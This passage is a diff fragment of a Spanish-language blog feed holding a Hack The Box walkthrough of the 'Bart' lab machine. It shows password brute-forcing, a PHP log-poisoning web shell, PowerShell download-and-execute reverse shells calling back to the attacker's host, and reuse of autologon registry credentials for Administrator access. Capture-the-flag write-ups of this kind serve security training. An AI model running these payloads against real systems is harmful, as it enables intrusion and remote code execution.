+❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;diccionario.txt | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[a-z]'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[A-Z]'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; dictionary.txt
+❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;diccionario.txt &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; dictionary.txt
+❯ &lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;dictionary.txt | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&amp;lt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;[a-z]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;1,4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\}\&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; dictionary_final.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con los comandos anteriores nos creamos un diccionario del sitio web quitando palabras que tengas una longitud de uno a cuatro caracteres. A partir de aquí podriamos utilizar nuestra herramienta de confianza &lt;strong&gt;&lt;em&gt;Burp Suite&lt;/em&gt;&lt;/strong&gt; para conocer la contraseña de dichos usuarios. Vamos a probar primeramente para el usuario &lt;em&gt;Harvey&lt;/em&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-brute.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que para dicho usuario, la contraseña es &lt;strong&gt;potter&lt;/strong&gt; y cuando tratamos de ver el sitio web, tenemos un nuevo dominio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://monitor.bart.htb/&lt;/code&gt;; por lo que lo agregamos a nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; para ver el contenido del sitio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-internal.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dentro del apartado &lt;strong&gt;&lt;em&gt;Servers&lt;/em&gt;&lt;/strong&gt; tenemos un nuevo dominio, así que vamos a agregamos de nuevo a nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; y tratamos de visualizar su contenido vía web.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-internal1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tenemos otro formulario de login, por lo que podríamos tratar de utilizar los usuarios que tenemos, así como posibles credenciales por defecto; sin embargo, adelanto que no nos va a funcionar. Observando la dirección url, se tiene el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/simple_chat/login_form.php&lt;/code&gt; y es posible que exista información sobre dicha tecnología en Internet. De las primeras opciones que tenemos buscando tal cual ese recurso, nos encontramos con lo siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/magkopian/php-ajax-simple-chat/blob/master/simple_chat/register.php&quot;&gt;register.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-github.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esto nos hace pensar que el sitio que estamos analizando puede presentar un recurso llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;register.php&lt;/code&gt; en el cual nos permitiría registrarnos y posteriormente tener acceso.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-register.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que no podemos acceder al recurso; sin embargo, eso no significa que no podamos aprovecharnos para creanos un usuario válido. Para lograr lo anterior, vamos a echarle un ojo a lo que encontramos en &lt;strong&gt;Github&lt;/strong&gt;, en el cual encontramos que se tramitan las variables &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uname&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt; a través del método POST; por lo tanto, podemos hacer uso de la herramienta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; para realizar la petición al servidor.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST http://internal-01.bart.htb/simple_chat/register.php &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uname=k4miyo&amp;amp;passwd=k4miyo123!'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Vamos a probar si tenemos acceso con las credenciales que definimos y tenemos acceso.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-chat.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Analizando el código fuente de la página, tenemos que se está corriendo una función llamada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;saveChat()&lt;/code&gt; en donde se tramita una solicitud hacia el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/log/log.php?filename=log.txt&amp;amp;username=harvey&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-log.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podriamos tratar de modificar el campo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt; para ver que nos devuelve el servidor y tenemos que para los usuarios válidos tenemos una respuesta de &lt;strong&gt;1&lt;/strong&gt; y para otros vemos un &lt;strong&gt;0&lt;/strong&gt;. Además, analizando el recurso, vemos que posiblemente se está tramitando algo hacia un recurso a llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;log.txt&lt;/code&gt;; por lo que vamos a echarle un ojo al recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/log/log.txt&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-log1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que cada ves que hacemos una consulta hacia http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;amp;username=harvey, se ve reflejado en el recurso http://internal-01.bart.htb/log/log.txt; además es posible que podamos crear archivos debido al parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filename&lt;/code&gt;:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;http://internal-01.bart.htb/log/log.php?filename=k4miyo.txt&amp;amp;username=daniel&lt;/li&gt;
+  &lt;li&gt;http://internal-01.bart.htb/log/k4miyo.txt&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Tenemos la posibilidad de crear archivos dentro del recurso, por lo que ya debemos estar pensando en un &lt;strong&gt;&lt;em&gt;log poisoning&lt;/em&gt;&lt;/strong&gt; enviando comandos a través del header:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: &amp;lt;?php system('whoami') ?&amp;gt;&quot;&lt;/span&gt; http://internal-01.bart.htb/log/log.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;k4miyo.txt&lt;span class=&quot;se&quot;&gt;\&amp;amp;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;daniel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-log2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que nuestro código no se interpreta y esto es normal debido a que estamos creando un archivo de texto (txt). Vamos a cambiar la extensión por &lt;strong&gt;php&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User-Agent: &amp;lt;?php system('whoami') ?&amp;gt;&quot;&lt;/span&gt; http://internal-01.bart.htb/log/log.php&lt;span class=&quot;se&quot;&gt;\?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;k4miyo.php&lt;span class=&quot;se&quot;&gt;\&amp;amp;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;daniel
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-log3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para trabajar un poco mejor, vamos a generar una variable que nos permita ejecutar comados y a través de python para evitar problemas con los caracteres especiales en bash:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3
+Python 3.9.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;default, Feb 28 2021, 17:03:44&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;GCC 10.2.1 20210110] on linux
+Type &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;copyright&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;credits&quot;&lt;/span&gt; or &lt;span class=&quot;s2&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; import requests
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; headers &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'User-Agent'&lt;/span&gt; : &lt;span class=&quot;s1&quot;&gt;'&amp;lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&amp;gt;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; r &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; requests.get&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://internal-01.bart.htb/log/log.php?filename=shell.php&amp;amp;username=daniel'&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;headers&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bart/bart-log4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora nos copiamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-PowerShellTcp.ps1&lt;/code&gt; a nuestro directorio de trabajo y procedemos a editarlo agregando la siguiente linea hasta el final del archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.17 -Port 443&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos compartimos un servidor HTTP con python y ejecutamos lo siguiente para ganar acceso a la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://internal-01.bart.htb/log/shell.php?cmd=C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe%20IEX(New-Object%20Net.WebClient).downloadString(%27http://10.10.14.17/PS.ps1%27)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.81 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;04/Oct/2021 23:21:41] &lt;span class=&quot;s2&quot;&gt;&quot;GET /PS.ps1 HTTP/1.1&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.17] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.81] 50342
+Windows PowerShell running as user BART&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;on BART
+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2015 Microsoft Corporation. All rights reserved.
+
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;nt authority&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;usr
+PS C:&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netpub&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;wwroot&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;nternal-01&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;og&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ya hemos ingresado a la máquina como el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\iusr&lt;/code&gt;. Vamos a comprobar si nos encontramos en un proceso de 64 bits.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Environment]::Is64BitProcess
+True
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Environment]::Is64BitOperatingSystem
+True
+PS C:&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;netpub&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;wwroot&lt;span class=&quot;se&quot;&gt;\i&lt;/span&gt;nternal-01&lt;span class=&quot;se&quot;&gt;\l&lt;/span&gt;og&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora nos queda escalar privilegios, por lo que pasamos a enumerar un poco la máquina:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /priv
+
+PRIVILEGES INFORMATION
+&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;
+
+Privilege Name          Description                               State  
+&lt;span class=&quot;o&quot;&gt;=======================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;
+SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
+SeImpersonatePrivilege  Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege Create global objects                     Enabled
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Tenemos el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SeImpersonatePrivilege&lt;/code&gt; habilitado, por lo que ya debemos estar pensando en &lt;strong&gt;Juicy Potato&lt;/strong&gt;; pero para esta vez vamos a utilizar otra vía para esclar privilegios&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;HKLM:
+PS HKLM:&amp;gt;
+&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;software&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;Windows NT&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;urrentversion&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;inlogon
+PS HKLM:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;oftware&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;icrosoft&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows NT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;urrentversion&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;inlogon&amp;gt;
+get-itemproperty . | findstr &quot;&lt;/span&gt;DefaultDomainName DefaultUserName DefaultPassword&lt;span class=&quot;s2&quot;&gt;&quot;
+DefaultDomainName            : DESKTOP-7I3S68E
+DefaultUserName              : Administrator
+DefaultPassword              : 3130438f31186fbaf962f407711faddb
+PS HKLM:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;oftware&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;icrosoft&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;indows NT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;urrentversion&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;inlogon&amp;gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora creamos nuestras variables para tener entablarnos una reverse shell como el usuario &lt;strong&gt;Administrator&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS HKLM:&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;oftware&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows NT&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;urrentversion&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;inlogon&amp;gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:
+PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hostname
+&lt;/span&gt;BART
+PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;BART&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dministrator&quot;&lt;/span&gt;
+PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;3130438f31186fbaf962f407711faddb&quot;&lt;/span&gt;
+PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$secstr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object &lt;span class=&quot;nt&quot;&gt;-TypeName&lt;/span&gt; System.Security.SecureString
+PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$password&lt;/span&gt;.ToCharArray&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; | ForEach-Object &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secstr&lt;/span&gt;.AppendChar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)}&lt;/span&gt;
+PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; New-Object &lt;span class=&quot;nt&quot;&gt;-TypeName&lt;/span&gt; System.Management.Automation.PSCredential &lt;span class=&quot;nt&quot;&gt;-argumentlist&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$secstr&lt;/span&gt;
+PS C:&lt;span class=&quot;se&quot;&gt;\&amp;gt;&lt;/span&gt; Invoke-Command &lt;span class=&quot;nt&quot;&gt;-ScriptBlock&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; IEX&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;New-Object Net.WebClient&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.downloadString&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'http://10.10.14.17/PS.ps1'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Credential&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cred&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Computer&lt;/span&gt; localhost
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Antes de ejecutar el último comando, compartimos un servidor HTTP con python y nos ponemos en escucha a través del puerto 443:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+Serving HTTP on 0.0.0.0 port 80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;http://0.0.0.0:80/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ...
+10.10.10.81 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;05/Oct/2021 20:46:33] &lt;span class=&quot;s2&quot;&gt;&quot;GET /PS.ps1 HTTP/1.1&quot;&lt;/span&gt; 200 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.17] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.81] 49680
+Windows PowerShell running as user Administrator on BART
+Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2015 Microsoft Corporation. All rights reserved.
+
+&lt;span class=&quot;nb&quot;&gt;whoami
+&lt;/span&gt;bart&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;dministrator
+PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A partir de este punto ya podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="PHP" /><category term="Log_Poisoning" /><category term="Powershell" /><summary type="html">Resolución de la máquina Bart en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Europa</title><link href="http://localhost:4000/htb-europa/" rel="alternate" type="text/html" title="Hack The Box Europa" /><published>2021-09-27T00:00:00-05:00</published><updated>2021-09-27T00:00:00-05:00</updated><id>http://localhost:4000/htb-europa</id><content type="html" xml:base="http://localhost:4000/htb-europa/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-europa/banner-europa.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;europa&quot;&gt;Europa&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.22.&lt;/p&gt;
@@ -4039,514 +4465,4 @@ nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
 C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
